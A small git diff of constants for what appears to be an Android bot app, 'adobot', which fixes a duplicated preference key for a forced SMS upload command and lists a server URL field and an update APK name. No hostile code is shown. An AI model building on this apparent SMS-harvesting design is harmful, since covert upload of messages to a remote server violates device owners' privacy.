@@ -11,7 +11,7 @@ public final class AdobotConstants {
     public static final String PACKAGE_NAME = "com.android.adobot";
     public static final String UPDATE_PKG_FILE_NAME = "update.apk";
     public static final String PREF_SMS_OPEN_TEXT_FIELD = "smsOpenText";
-    public static final String PREF_UPLOAD_SMS_COMMAND_FIELD = "smsOpenText";
+    public static final String PREF_UPLOAD_SMS_COMMAND_FIELD = "smsForceUpload";
 
     public static final String PREF_SERVER_URL_FIELD = "serverUrl";
     public static final String DEVELOPMENT_SERVER = "http://192.168.1.251:3000";
